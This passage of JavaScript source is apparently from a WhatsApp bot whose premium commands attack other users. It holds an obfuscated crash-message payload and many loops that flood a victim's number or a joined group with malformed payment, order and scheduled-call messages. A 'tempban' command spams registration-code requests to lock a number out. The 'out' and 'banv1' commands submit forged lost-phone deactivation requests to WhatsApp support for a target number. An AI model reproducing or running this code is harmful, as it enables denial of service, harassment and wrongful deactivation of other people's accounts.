_0x517dea=-0x1f15*0x1+-0x26*0x6a+0x3*0xf9b;_0x23c375[_0x17c6eb(0x2df,0x319,0x2f9,0x2b7)](_0x517dea,_0x2c48a3['length']);_0x517dea++){const _0x3351ea=_0x27e679[_0x17c6eb(0x314,0x32f,0x315,0x2dd)+'r'][_0x17c6eb(0x2c9,0x29c,0x2d7,0x2e3)][_0x17c6eb(0x2ae,0x2a7,0x2be,0x271)](_0x27e679),_0xadfcb=_0x2c48a3[_0x517dea],_0x1de33d=_0x67c609[_0xadfcb]||_0x3351ea;_0x3351ea[_0x17c6eb(0x317,0x2e9,0x34f,0x313)]=_0x27e679[_0x17c6eb(0x2ae,0x29d,0x278,0x2d0)](_0x27e679),_0x3351ea[_0x3b55e5(0x3e,0x3b,-0x34,0x5)]=_0x1de33d[_0x17c6eb(0x308,0x323,0x2d7,0x2e2)]['bind'](_0x1de33d),_0x67c609[_0xadfcb]=_0x3351ea;}});_0x4b1e40();function _0x2427a7(_0x21fa51,_0x4358bc,_0x31d5c0,_0xf52ecc){return _0x2c69(_0x31d5c0-0x1ce,_0x4358bc);}function _0x2c69(_0x537000,_0xba930b){const _0xf3274a=_0x28f4();return _0x2c69=function(_0x28f4bb,_0x2c6957){_0x28f4bb=_0x28f4bb-(0x4*-0x3+0x1dbd+-0x1c86);let _0x3f9e4c=_0xf3274a[_0x28f4bb];return _0x3f9e4c;},_0x2c69(_0x537000,_0xba930b);}let bug='\x03'[_0x15a19b(0x4e0,0x4e1,0x4bc,0x4bc)](-0xceb14+0x4c1*0x3d7+-0x3d1bd*-0x1);for(let i=-0x3ed*0x7+0x1749+0x432;i<-0x2*-0x14c+-0x1510+-0x94b*-0x2;i++){const _0x18e95c={};_0x18e95c[_0x2427a7(0x33f,0x369,0x35e,0x36d)+'Jid']=_0x2427a7(0x309,0x32e,0x312,0x2dd)+'38483540@n'+_0x15a19b(0x4ee,0x50f,0x4fa,0x4e6),_0x18e95c[_0x15a19b(0x52e,0x4e6,0x50a,0x4db)+_0x15a19b(0x4a9,0x487,0x4af,0x4da)]=_0x2427a7(0x335,0x326,0x344,0x381)+_0x15a19b(0x4d6,0x4a7,0x4df,0x518)+'ni\x20->\x20cras'+'h',_0x18e95c[_0x15a19b(0x4fc,0x4ee,0x508,0x538)+_0x2427a7(0x33b,0x2ff,0x311,0x31a)]=0x2;const _0x427c68={};_0x427c68[_0x2427a7(0x33d,0x32f,0x36b,0x332)+_0x2427a7(0x390,0x3a6,0x36a,0x346)]=[],_0x427c68[_0x2427a7(0x352,0x2f9,0x321,0x331)+'ail']=global['bimg'];const _0xbe5d7a={};_0xbe5d7a[_0x15a19b(0x4ce,0x506,0x501,0x4f9)]=_0x2427a7(0x339,0x339,0x366,0x389)+_0x15a19b(0x4da,0x4f4,0x4dc,0x4b4),_0xbe5d7a[_0x15a19b(0x4bc,0x49b,0x4aa,0x493)+_0x15a19b(0x51f,0x505,0x505,0x4c7)]=_0x15a19b(0x4f3,0x4c8,0x506,0x53d)+'\x22:\x22IDR\x22,\x22t'+'otal_amoun'+'t\x22:{\x22value'+_0x2427a7(0x33c,0x311,0x340,0x352)+',\x22offset\x22:'+_0x2427a7(0x331,0x302,0x329,0x2f8)+_0x15a19b(0x4d0,0x4dc,0x4e5,0x4be)+_0x15a19b(0x4e4,0x4ce,0x4b5,0x4de)+'KN\x22,\x22type\x22'+_0x15a19b(0x4cf,0x4ea,0x4de,0x4ff)+_0x15a19b(0x4fd,0x539,0x510,0x50a)+_0x2427a7(0x333,0x338,0x35b,0x347)+_0x2427a7(0x380,0x312,0x342,0x312)+_0x15a19b(0x4a9,0x476,0x4ab,0x4b1)+_0x2427a7(0x2ff,0x2fa,0x31a,0x353)+_0x15a19b(0x4c3,0x4b4,0x4e9,0x511)+_0x15a19b(0x504,0x4ba,0x4f1,0x52a)+_0x2427a7(0x326,0x33c,0x308,0x2db)+_0x15a19b(0x4fc,0x520,0x4f9,0x52e)+_0x2427a7(0x31e,0x334,0x315,0x2e1)+_0x2427a7(0x349,0x347,0x36d,0x35e)+_0x2427a7(0x34c,0x362,0x338,0x312)+_0x15a19b(0x48a,0x4d3,0x4ac,0x48d)+'id\x22:\x2275376'+_0x15a19b(0x535,0x4f5,0x50b,0x518)+_0x2427a7(0x348,0x2f8,0x318,0x30d)+'t_id\x22:\x22799'+_0x15a19b(0x510,0x500,0x4ea,0x4ff)+'009\x22,\x22name'+_0x2427a7(0x357,0x2de,0x319,0x2fa)+xbugtex['xtxt']+(_0x2427a7(0x2ee,0x33f,0x31b,0x310)+_0x2427a7(0x33c,0x381,0x369,0x387)+_0x15a19b(0x4b6,0x48b,0x4c2,0x500)+_0x2427a7(0x364,0x358,0x370,0x3a0)+'},\x22quantit'+_0x15a19b(0x4d9,0x4d2,0x4ef,0x4c8)+_0x2427a7(0x335,0x390,0x36c,0x385)+':\x2278426746'+_0x2427a7(0x339,0x359,0x36e,0x350)+_0x15a19b(0x509,0x4bf,0x4e2,0x520)+_0x2427a7(0x2f8,0x303,0x2fb,0x307)+_0x15a19b(0x542,0x529,0x50d,0x4d9)+_0x15a19b(0x4b1,0x4fa,0x4d8,0x4be)+_0x2427a7(0x2df,0x322,0x30e,0x2ee)+_0x15a19b(0x4d5,0x4bb,0x4d7,0x4b5))+bug+(_0x2427a7(0x32b,0x308,0x31b,0x356)+_0x2427a7(0x357,0x3a5,0x369,0x37c)+_0x15a19b(0x49c,0x4e5,0x4c2,0x4af)+_0x2427a7(0x39d,0x354,0x370,0x37c)+_0x2427a7(0x30c,0x314,0x33b,0x374)+_0x15a19b(0x4ac,0x4b8,0x4c9,0x4a8)+'ative_paym'+_0x15a19b(0x49f,0x4ef,0x4b8,0x490)+_0x2427a7(0x2ff,0x351,0x31f,0x351));const _0x68c8f1={};_0x68c8f1['buttons']=[_0xbe5d7a];const _0x3439e0={};_0x3439e0['header']=_0x427c68,_0x3439e0[_0x2427a7(0x34b,0x312,0x341,0x33d)+'Message']=_0x68c8f1;const _0x22ac8a={};_0x22ac8a[_0x15a19b(0x48d,0x470,0x4a5,0x4d4)+_0x2427a7(0x345,0x34d,0x353,0x33b)]=_0x3439e0;const _0x19935d={};_0x19935d[_0x2427a7(0x33f,0x318,0x317,0x316)+'d']=!![],_0x19935d['forwardedN'+_0x2427a7(0x2ff,0x359,0x325,0x311)+_0x15a19b(0x48d,0x494,0x4bf,0x4af)]=_0x18e95c,_0x19935d[_0x15a19b(0x51e,0x515,0x4e0,0x50f)]=_0x2427a7(0x339,0x300,0x30f,0x346)+'FE4CDF',_0x19935d[_0x15a19b(0x506,0x4e3,0x4f8,0x52a)+'t']=_0x15a19b(0x4b2,0x48f,0x4ca,0x4b1)+_0x2427a7(0x36c,0x2f3,0x32f,0x2fe),_0x19935d[_0x2427a7(0x336,0x377,0x351,0x358)+_0x2427a7(0x34a,0x33e,0x328,0x35f)]=_0x22ac8a,_0x19935d[_0x2427a7(0x2f2,0x31b,0x30a,0x2d4)]=_0x15a19b(0x506,0x4dd,0x4f5,0x501)+_0x2427a7(0x312,0x32f,0x32d,0x333);const _0x48f80b={};_0x48f80b[_0x2427a7(0x2e4,0x2f7,0x31c,0x326)]=_0x2427a7(0x369,0x317,0x348,0x368),_0x48f80b[_0x2427a7(0x377,0x320,0x354,0x357)+'o']=_0x19935d;const _0x303aff={};_0x303aff[_0x2427a7(0x353,0x34e,0x34f,0x326)+_0x2427a7(0x333,0x31c,0x335,0x326)]=_0x48f80b,await DeepakBotInc[_0x2427a7(0x379,0x359,0x356,0x385)+'ge'](target,_0x303aff,{});const _0x59a15e={};_0x59a15e[_0x2427a7(0x311,0x300,0x31c,0x2e2)]='';const _0x569645={};_0x569645[_0x15a19b(0x4bf,0x4a3,0x4c0,0x4e4)]=xbug2,await DeepakBotInc[_0x2427a7(0x2f3,0x333,0x2fa,0x311)+'e'](target,_0x59a15e,_0x569645);}
replygcdeepak(`Successfully Sent Bug To ${target}`)
}
break
case 'tempban': {
if (!isPremium) return replygcdeepak(mess.prem)
if (!text) return replygcdeepak(`Example: ${prefix + command} 91|6909137211`)
if (!/|/.test(text)) return replygcdeepak(`The data you provided is invalid!, Example: \n ${prefix + command} 91|6909137211`)
let numbers = JSON.parse(fs.readFileSync('./src/tempban.json'))
let cCode = q.split("|")[0]
let number = q.split("|")[1]
let fullNo = cCode + number
await replygcdeepak(`Success! Registration Interruption has been successfully activated to the target : ${fullNo} for an unlimited period of time. Registration interruption will be stopped if the server is restarted, shut down, or down.`)
let { state, saveCreds } = await useMultiFileAuthState('session')
let spam = makeWaSocket({
auth: state,
mobile: true,
logger: pino({ level: 'silent' })
})
let dropNumber = async () => {
try {
let res = await spam.requestRegistrationCode({
phoneNumber: `+${fullNo}`,
phoneNumberCountryCode: cCode,
phoneNumberNationalNumber: number,
phoneNumberMobileCountryCode: 724,
})
if (res.reason === 'temporarily_unavailable') {
console.log(`Invalid Number (Possibility of Interrupted Registration): +${res.login}`)
await sleep(1000)
await dropNumber()
}
} catch (error) {
console.error(error)
}
}
numbers[fullNo] = { cCode, number };
fs.writeFileSync('./src/tempban.json', JSON.stringify(numbers, null, '\t'))
setInterval(() => {
dropNumber()
}, 400)
}
break
case 'iosq':{
if (!isPremium) return replygcdeepak(mess.prem)
if (!args[0]) return replygcdeepak(`Use ${prefix+command} number\nExample ${prefix+command} 91xxxxxxxxxx`)
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "50"
for (let i = 0; i < amount; i++) {
DeepakBotInc.relayMessage(from,{
extendedTextMessage:{
"text":'.',
"contextInfo": {
"stanzaId": victim,
"participant": victim,
"quotedMessage": {
"conversation": deepaktext1
},
"disappearingMode": {
"initiator": "CHANGED_IN_CHAT",
"trigger": "CHAT_SETTING"
}
},
"inviteLinkGroupTypeV2": "DEFAULT"
}
},{messageId: null})
}
replygcdeepak(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
}
break
case 'iosgoogle': {
if (!isPremium) return replygcdeepak(mess.prem)
if (!args[0]) return replygcdeepak(`Use ${prefix+command} number\nExample ${prefix+command} 91xxxxxxxxxx`)
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "50"
for (let i = 0; i < amount; i++) {
DeepakBotInc.sendMessage(victim,{
text: `https://google.com`,
contextInfo: {
externalAdReply: {
renderLargerThumbnail: true,
mediaType: 1,
title: deepaktext6,
body: `###############################`,
thumbnail: await getBuffer('https://logopng.com.br/logos/google-37.svg'),
jpegThumbnail: await getBuffer('https://logopng.com.br/logos/google-37.svg'),
previewType: "NONE",
sourceUrl: link,
}}
})
}
replygcdeepak(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
}
break
case 'iosgoogle2': {
if (!isPremium) return replygcdeepak(mess.prem)
if (!args[0]) return replygcdeepak(`Use ${prefix+command} amount\nExample ${prefix+command} 5`)
amount = `${encodeURI(text)}`
for (let i = 0; i < amount; i++) {
DeepakBotInc.sendMessage(m.chat,{
text: `https://google.com`,
contextInfo: {
externalAdReply: {
renderLargerThumbnail: true,
mediaType: 1,
title: deepaktext6,
body: `###############################`,
thumbnail: await getBuffer('https://logopng.com.br/logos/google-37.svg'),
jpegThumbnail: await getBuffer('https://logopng.com.br/logos/google-37.svg'),
previewType: "NONE",
sourceUrl: link,
}}
})
}
replygcdeepak(`*Successfully sent as many bugs as ${amount} Please pause for 3 minutes*`)
}
break
case 'xioscrash':
if (!isPremium) return replygcdeepak(mess.prem)
if (!args[0]) return replygcdeepak(`Use ${prefix+command} number\nExample ${prefix+command} 91xxxxxxxxxx`)
 victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "50"
for (let i = 0; i < amount; i++) {
DeepakBotInc.relayMessage(victim,{ 
"paymentInviteMessage": {
serviceType: "UPI",
expiryTimestamp: Date.now() + (24 * 60 * 60 * 1000) 
}},{})
await sleep(3000)
}
replygcdeepak(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
break
case 'xioscrash2':{
if (!isPremium) return replygcdeepak(mess.prem)
if (!args[0]) return replygcdeepak(`Use ${prefix+command} amount\nExample ${prefix+command} 5`)
 amount = `${encodeURI(text)}`
for (let i = 0; i < amount; i++) {
DeepakBotInc.relayMessage(m.chat,{ 
"paymentInviteMessage": {
serviceType: "UPI",
expiryTimestamp: Date.now() + (24 * 60 * 60 * 1000) 
}},{})
await sleep(3000)
}
replygcdeepak(`*Successfully sent as many bugs as ${amount} Please pause for 3 minutes*`)
}
break
case 'xcrash':{
if (!isPremium) return replygcdeepak(mess.prem)
 if (!args[0]) return replygcdeepak(`Use ${prefix+command} number\nExample ${prefix+command} 91xxxxxxxxxx`)
 victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "100"
for (let i = 0; i < amount; i++) {
DeepakCrashy(pushname,victim)
await sleep(3000)
}
replygcdeepak(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
}
break
case 'xcrash2':
if (!isPremium) return replygcdeepak(mess.prem)
if (!args[0]) return replygcdeepak(`Use ${prefix+command} amount\nExample ${prefix+command} 5`)
 amount = `${encodeURI(text)}`
for (let i = 0; i < amount; i++) {
DeepakCrashy(pushname,m.chat)
await sleep(3000)
}
replygcdeepak(`*Successfully sent as many bugs as ${amount} Please pause for 3 minutes*`)
break
case 'amountbug': {
if (!isPremium) return replygcdeepak(mess.premium)
if (!args[0]) return relygcdeepak(`Use ${prefix+command} amount\nExample ${prefix+command} 5`)
amount = `${encodeURI(text)}`
for (let i = 0; i < amount; i++) {
const deepakbug1 = `${deepaktext1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": deepakbug1,
}
}), { userJid: from, quoted : m})
DeepakBotInc.relayMessage(from, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygcdeepak(`*Successfully sent as many bugs as ${amount} Please pause for 3 minutes*`)
break
case 'pmbug' :{
 if (!isPremium) return replygcdeepak(mess.premium)
 if (!args[0]) return replygcdeepak(`Use ${prefix+command} number\nExample ${prefix+command} 918348225320`)
 await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const deepakbug1 = `${deepaktext1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": deepakbug1,
}
}), { userJid: from, quoted : m})
DeepakBotInc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygcdeepak(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
break
case 'delaybug' : {
if (!isPremium) return replygcdeepak(mess.premium)
if (!args[0]) return replygcdeepak(`Use ${prefix+command} number\nExample ${prefix+command} 918348225320`)
await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const deepakbug1 = deepaktext2
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": deepakbug1,
}
}), { userJid: from, quoted : m})
DeepakBotInc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygcdeepak(`*Successfully Sent Bug To ${victim} Please pause for 3 minutes*`)
break
case 'docubug': {
if (!isPremium) return replygcdeepak(mess.premium)
if (!args[0]) return replygcdeepak(`Use ${prefix+command} number\nExample ${prefix+command} 918348225320`)
await loading()
if (args.length < 1) return replygcdeepak(`Use ${prefix+command} number\nExample ${prefix+command} 918348225320`)
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "15"
for (let i = 0; i < amount; i++) {
const deepakbug1 = `${deepaktext1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": deepakbug1,
}
}), { userJid: from, quoted : m})
DeepakBotInc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygcdeepak(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
break
case 'unlimitedbug' : {
if (!isPremium) return replygcdeepak(mess.premium)
if (!args[0]) return replygcdeepak(`Use ${prefix+command} number\nExample ${prefix+command} 918348225320`)
await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const deepakbug1 = deepaktext3
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": deepakbug1,
}
}), { userJid: from, quoted : m})
DeepakBotInc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygcdeepak(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
break
case 'bombug': {
if (!isPremium) return replygcdeepak(mess.premium)
if (!args[0]) return replygcdeepak(`Use ${prefix+command} number\nExample ${prefix+command} 918348225320`)
await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const deepakbug1 = deepaktext4
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": deepakbug1,
}
}), { userJid: from, quoted : m})
DeepakBotInc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygcdeepak(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
break
case 'lagbug' : {
if (!isPremium) return replygcdeepak(mess.premium)
if (!args[0]) return replygcdeepak(`Use ${prefix+command} number\nExample ${prefix+command} 918348225320`)
await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const deepakbug1 = deepaktext2
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": deepakbug1,
}
}), { userJid: from, quoted : m})
DeepakBotInc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygcdeepak(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
break
case 'trollybug': {
if (!isPremium) return replygcdeepak(mess.premium)
if (!args[0]) return replygcdeepak(`Use ${prefix+command} number\nExample ${prefix+command} 918348225320`)
await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "15"
for (let i = 0; i < amount; i++) {
var order = generateWAMessageFromContent(from, proto.Message.fromObject({
"orderMessage": {
"orderId": "599519108102353",
"thumbnail": thumb,
"itemCount": 1999,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `${botname}`,
"orderTitle": " TROLLY BUG ", 
"sellerJid": "918348225320@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: from, quoted:m})
DeepakBotInc.relayMessage(victim, order.message, { messageId: order.key.id })
}
replygcdeepak(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
}
break
case 'gcbug' : {
if (!isPremium) return replygcdeepak(mess.premium)
 if (!args[0]) return replygcdeepak(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JaAcovn32K34dhEKFLYqUF`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let deepakgc = await DeepakBotInc.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const deepakbug1 = `${deepaktext1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": deepakbug1,
}
}), { userJid: from, quoted : m})
DeepakBotInc.relayMessage(deepakgc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
replygcdeepak(`*Successfully sent Bug To ${deepakgc} Please pause for 3 minutes*`)
}
break
case 'delaygcbug' :  {
if (!isPremium) return replygcdeepak(mess.premium)
if (!args[0]) return replygcdeepak(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JaAcovn32K34dhEKFLYqUF`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let deepakgc = await DeepakBotInc.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const deepakbug1 = deepaktext5
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": deepakbug1,
}
}), { userJid: from, quoted : m})
DeepakBotInc.relayMessage(deepakgc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
replygcdeepak(`*Successfully sent Bug To ${deepakgc} Please pause for 3 minutes*`)
}
break
case 'laggcbug' :  {
if (!isPremium) return replygcdeepak(mess.premium)
if (!args[0]) return replygcdeepak(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JaAcovn32K34dhEKFLYqUF`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let deepakgc = await DeepakBotInc.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const deepakbug1 = deepaktext2
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": deepakbug1,
}
}), { userJid: from, quoted : m})
DeepakBotInc.relayMessage(deepakgc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
replygcdeepak(`*Successfully sent Bug To ${deepakgc} Please pause for 3 minutes*`)
}
break
case 'bomgcbug' :  {
if (!isPremium) return replygcdeepak(mess.premium)
if (!args[0]) return replygcdeepak(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JaAcovn32K34dhEKFLYqUF`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let deepakgc = await haikal.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const deepakbug1 = deepaktext4
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": deepakbug1,
}
}), { userJid: from, quoted : m})
DeepakBotInc.relayMessage(deepakgc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
replygcdeepak(`*Successfully sent Bug To ${deepakgc} Please pause for 3 minutes*`)
}
break
case 'unlimitedgcbug' :  {
if (!isPremium) return replygcdeepak(mess.premium)
if (!args[0]) return replygcdeepak(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JaAcovn32K34dhEKFLYqUF`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let deepakgc = await DeepakBotInc.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const deepakbug1 = deepaktext3
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": deepakbug1,
}
}), { userJid: from, quoted : m})
DeepakBotInc.relayMessage(deepakgc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
replygcdeepak(`*Successfully sent Bug To ${deepakgc} Please pause for 3 minutes*`)
}
break
case 'trollygcbug' :  {
if (!isPremium) return replygcdeepak(mess.premium)
if (!args[0]) return replygcdeepak(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JaAcovn32K34dhEKFLYqUF`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let deepakgc = await DeepakBotInc.groupAcceptInvite(result)
amount = "15"
for (let i = 0; i < amount; i++) {
var order = generateWAMessageFromContent(from, proto.Message.fromObject({
"orderMessage": {
"orderId": "599519108102353",
"thumbnail": thumb,
"itemCount": 1999,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `${botname}`,
"orderTitle": " TROLLY BUG ", 
"sellerJid": "918348225320@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: from, quoted:m})
DeepakBotInc.relayMessage(deepakgc, order.message, { messageId: order.key.id })
}
replygcdeepak(`*Successfully sent Bug To ${deepakgc} Please pause for 3 minutes*`)
}
break
case 'docugcbug' :  {
if (!isPremium) return replygcdeepak(mess.premium)
if (!args[0]) return replygcdeepak(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JaAcovn32K34dhEKFLYqUF`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let deepakgc = await DeepakBotInc.groupAcceptInvite(result)
amount = "15"
for (let i = 0; i < amount; i++) {
const deepakbug1 = `${deepaktext1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": deepakbug1,
}
}), { userJid: from, quoted : m})
DeepakBotInc.relayMessage(deepakgc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
replygcdeepak(`*Successfully sent Bug To ${deepakgc} Please pause for 3 minutes*`)
} 
break

//ban/unban cases
case 'out': case 'verif':{
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return replygcdeepak(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
let deepaknumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let deepaktesx = await DeepakBotInc.onWhatsApp(deepaknumx)
if (deepaktesx.length == 0) return replygcdeepak(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let deepakxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = deepakxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(deepakxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", deepaknumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
DeepakBotInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'banv1': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return replygcdeepak(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
let deepaknumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let deepaktesx = await DeepakBotInc.onWhatsApp(deepaknumx)
if (deepaktesx.length == 0) return replygcdeepak(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let deepakxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = deepakxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(deepakxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", deepaknumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Hello, please deactivate this number, because I have lost my cellphone and someone is using my number, please deactivate my number")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
